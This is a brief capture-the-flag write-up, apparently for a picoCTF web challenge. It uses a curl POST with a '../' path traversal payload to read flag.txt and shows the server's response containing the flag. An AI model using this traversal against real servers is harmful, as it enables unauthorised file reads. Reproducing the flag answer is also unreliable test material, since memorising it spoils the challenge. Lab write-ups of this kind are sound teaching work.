1. Look at the structure of the requests being made. We find that a POST request is made to `http://saturn.picoctf.net:56978/read.php` with the data `filename=<filename>&read=`
2. Do some basic file travelsal
```
curl -d "filename=../../../../../../../../../../../flag.txt&read="  http://saturn.picoctf.net:56978/read.php
```
```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="style.css">
    <title>Web eReader</title>
  </head>
  <body>
    
    picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}<br>  </body>
</html>
```
